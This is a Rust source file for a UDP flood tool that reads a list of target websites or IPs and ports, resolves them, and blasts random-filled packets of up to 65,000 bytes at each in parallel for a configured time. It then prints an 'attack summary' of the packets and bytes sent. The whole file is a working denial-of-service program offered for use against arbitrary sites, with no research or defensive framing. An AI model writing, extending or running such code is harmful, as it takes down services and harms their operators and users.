#[macro_use]
extern crate log;

extern crate pretty_env_logger;

use std::collections::HashMap;
use std::{
    fmt::{Debug, Display, Formatter},
    fs::File,
    io::{BufRead, BufReader},
    net::{SocketAddr, UdpSocket},
    sync::{Arc, Mutex},
    thread::sleep,
    time::{Duration, Instant},
};

use anyhow::*;
use dns_lookup::lookup_host;
use itertools::Itertools;
use online::sync::check;
use portpicker::pick_unused_port;
use rand::{thread_rng, RngCore};
use rayon::prelude::*;

// ----- Attack Config START -----
#[derive(Clone)]
struct Config {
    execution_time: u64,
    timeout: Duration,
    packet_size: usize,
    default_ports: Vec<String>,
    unreachable_stop_trying: bool,
    summary: bool,
}

impl Config {
    pub fn load() -> Result<Self> {
        info!("Loading Main Config File...");

        let config_file = File::open("config")?;
        let config_lines = BufReader::new(config_file).lines();

        // Default execution time - a minute
        let mut execution_time = 60;

        // Default timeout - 10ms
        let mut timeout = 10;

        // Default packet size - 65000 bytes
        let mut packet_size = 65000;

        let mut default_ports = vec![];

        // Default for stop trying to attack unreachable anymore websites - true
        let mut unreachable_stop_trying = true;

        // Default for showing summary - true
        let mut summary = true;

        for config_line in config_lines.flatten() {
            if config_line.is_empty() || config_line.trim().starts_with("//") {
                continue;
            }

            let mut split = config_line.split(' ');

            if let Some(first) = split.next() {
                match first {
                    "execution_time" => {
                        if let Some(ex_time) = split.next() {
                            execution_time = ex_time.parse()?;
                        }
                    }
                    "timeout" => {
                        if let Some(t_out) = split.next() {
                            timeout = t_out.parse()?;
                        }
                    }
                    "packet_size" => {
                        if let Some(p_size) = split.next() {
                            packet_size = p_size.parse()?;
                        }
                    }
                    "default_ports" => {
                        while let Some(port) = split.next() {
                            default_ports.push(port.to_string());
                        }
                    }
                    "unreachable_stop_trying" => {
                        if let Some(u_s_t) = split.next() {
                            unreachable_stop_trying = match u_s_t.to_lowercase().as_str() {
                                "true" => true,
                                "false" => false,
                                _ => true,
                            }
                        }
                    }
                    "summary" => {
                        if let Some(sum) = split.next() {
                            summary = match sum.to_lowercase().as_str() {
                                "true" => true,
                                "false" => false,
                                _ => true,
                            }
                        }
                    }
                    _ => {}
                }
            }
        }

        // Default port if not set - 80
        if default_ports.len() == 0 {
            default_ports.push("80".to_string());
        }

        let config = Config {
            execution_time,
            timeout: Duration::from_millis(timeout),
            packet_size,
            default_ports,
            unreachable_stop_trying,
            summary,
        };

        info!("Loaded config: {}", config);

        Ok(config)
    }
}

impl Display for Config {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "Config {{ execution_time: {}s, timeout: {}ms, packet_size: {} bytes, default_ports: [{}], unreachable_stop_trying: {}, summary: {} }}",
            self.execution_time,
            self.timeout.as_millis(),
            self.packet_size,
            self.default_ports.join(", "),
            self.unreachable_stop_trying,
            self.summary
        )
    }
}
// ----- Attack Config END -----

// ----- Website Configuration START -----
#[derive(Clone)]
struct WebsiteConfig {
    pub address: String,
    pub ports: Vec<String>,
    pub is_domain: bool,
}

impl WebsiteConfig {
    pub fn load_configs(config: &Config) -> Result<Vec<WebsiteConfig>> {
        info!("Loading websites configs...");

        let configs = Arc::new(Mutex::new(vec![]));
        let websites_file = File::open("websites")?;
        let websites = BufReader::new(websites_file).lines();

        websites
            .flatten()
            .collect::<Vec<_>>()
            .par_iter()
            .for_each(|website| match Self::load(website, config) {
                None => return,
                Some(website_config) => (*configs).lock().unwrap().push(website_config),
            });

        info!("All websites loaded!\n{:?}", configs);

        let res = Ok(configs.lock().unwrap().clone());
        res
    }

    fn load(website: &str, config: &Config) -> Option<WebsiteConfig> {
        if website.is_empty() || website.trim().starts_with("//") {
            return None;
        }

        let mut split = website.split(' ');

        if let Some(first) = split.next() {
            let is_domain = match first {
                "ip" => false,
                "domain" => true,
                _ => false,
            };

            if let Some(address) = split.next() {
                let mut ports = vec![];

                while let Some(port) = split.next() {
                    ports.push(port.to_string());
                }

                if ports.len() == 0 {
                    ports = config.default_ports.clone();
                }

                for port in ports.iter() {
                    info!(
                        "Found {} {} with port {}",
                        if is_domain { "domain" } else { "ip" },
                        address,
                        port
                    );
                }

                return Some(WebsiteConfig {
                    address: address.to_string(),
                    ports,
                    is_domain,
                });
            }

            return None;
        }

        return None;
    }
}

impl Debug for WebsiteConfig {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        let spacing = if self.is_domain { " " } else { "" };

        write!(
            f,
            "[{}]",
            self.ports
                .iter()
                .map(|port| format!("{}{}:{}{}", self.address, spacing, spacing, port))
                .collect::<Vec<_>>()
                .join(", ")
        )
    }
}
// ----- Website Configuration END -----

// ----- Attack Summary START -----
#[derive(Default, Clone)]
struct PacketSummary {
    amount: u128,
    size: u128,
}

impl PacketSummary {
    pub fn show(&self, socket_address: &str) {
        info!(
            "Socket Address: {}, Packets Sent: {}, Sum Packet Size: {}B",
            socket_address,
            self.amount,
            Self::packet_size_output(self.size)
        );
    }

    fn packet_size_output(size: u128) -> String {
        let mut output = format!("{}B", size);

        let mut size = size as f64 / 1000.0;
        if size >= 1.0 {
            output += &format!(" ({}MiB", size);

            size /= 1000.0;
            if size >= 1.0 {
                output += &format!(", {}GiB", size);
            }

            output += ")";
        }

        output
    }
}
// ----- Attack Summary END -----

// ----- Attack Websites START -----
struct Attacker {
    pub config: Config,
    pub website_configs: Vec<WebsiteConfig>,
    pub summary: Arc<Mutex<HashMap<String, PacketSummary>>>,
}

impl Attacker {
    pub fn attack_websites(&self) {
        info!("Starting attack on the websites...");

        let start = Instant::now();

        let socket_addresses = Arc::new(Mutex::new(vec![]));

        self.website_configs.par_iter().for_each(|website_config| {
            if !website_config.is_domain {
                website_config.ports.par_iter().for_each(|port| {
                    (*socket_addresses).lock().unwrap().push(format!(
                        "{}:{}",
                        website_config.address,
                        port.clone()
                    ));
                });
            } else {
                if let std::result::Result::Ok(ips) = lookup_host(&website_config.address) {
                    ips.par_iter().for_each(|ip| {
                        website_config.ports.par_iter().for_each(|port| {
                            (*socket_addresses)
                                .lock()
                                .unwrap()
                                .push(format!("{}:{}", ip, port));
                        });
                    });
                } else {
                    error!(
                        "Couldn't find ips for the domain {}",
                        website_config.address
                    );
                }
            }
        });

        let socket_addresses = (*socket_addresses)
            .lock()
            .unwrap()
            .clone()
            .into_iter()
            .unique()
            .collect::<Vec<_>>();

        socket_addresses.par_iter().for_each(|socket_address| {
            let sender: SocketAddr = format!(
                "0.0.0.0:{}",
                pick_unused_port().expect("No free port found!")
            )
            .parse()
            .expect("Couldn't get sender IP address");

            info!("Creating socket for {} ...", sender);

            let socket =
                UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));

            let mut summary_added = false;

            while start.elapsed().as_secs() < self.config.execution_time {
                match socket.connect(socket_address.clone()) {
                    std::result::Result::Ok(_) => {
                        if self.config.summary && !summary_added {
                            summary_added = true;

                            (*self.summary)
                                .lock()
                                .unwrap()
                                .insert(socket_address.clone(), PacketSummary::default());
                        }

                        let buffer = self.generate_buffer();

                        let res = socket.send(buffer.as_slice());

                        match res {
                            std::result::Result::Ok(size) => {
                                info!(
                                    "Successfully sent a packet of size {} to {}",
                                    size, socket_address
                                );

                                if self.config.summary {
                                    if let Some(summary) =
                                        (*self.summary).lock().unwrap().get_mut(socket_address)
                                    {
                                        summary.size += size as u128;
                                        summary.amount += 1;
                                    }
                                }
                            }
                            std::result::Result::Err(error) => {
                                error!(
                                    "Failed to send a packet to {} .\nError message: {}",
                                    socket_address, error
                                );

                                if self.config.unreachable_stop_trying {
                                    break;
                                }
                            }
                        }

                        sleep(self.config.timeout);
                    }
                    std::result::Result::Err(error) => {
                        error!(
                            "Couldn't connect to {}.\nError message: {}",
                            socket_address, error
                        );

                        break;
                    }
                }
            }
        });

        if self.config.summary {
            self.show_summary()
        }
    }

    fn generate_buffer(&self) -> Vec<u8> {
        let mut buffer = Vec::with_capacity(self.config.packet_size);
        unsafe {
            buffer.set_len(self.config.packet_size);
        }

        thread_rng().fill_bytes(buffer.as_mut_slice());

        buffer
    }

    fn show_summary(&self) {
        info!("~~~~~~~ Attack Summary START ~~~~~~~");
        let mut sum_packets = 0;
        let mut sum_packet_size = 0;

        for (socket_address, packet_summary) in (*self.summary).lock().unwrap().iter() {
            sum_packets += packet_summary.amount;
            sum_packet_size += packet_summary.size;

            packet_summary.show(socket_address);
        }

        info!(
            "Sum Packets Sent: {}, Sum Packets Size: {}",
            sum_packets,
            PacketSummary::packet_size_output(sum_packet_size)
        );
        info!("~~~~~~~ Attack Summary END ~~~~~~~");
    }
}
// ----- Attack Websites END -----

fn main() -> Result<()> {
    std::env::set_var("RUST_LOG", "info");

    pretty_env_logger::init_timed();

    if let Err(error) = check(None) {
        error!(
            "Connectivity Issues! Check your internet connection!\nError message: {}",
            error
        );

        return Ok(());
    }

    let config = Config::load()?;
    let website_configs = WebsiteConfig::load_configs(&config)?;

    let attacker = Attacker {
        config,
        website_configs,
        summary: Arc::new(Mutex::new(HashMap::new())),
    };

    attacker.attack_websites();

    Ok(())
}
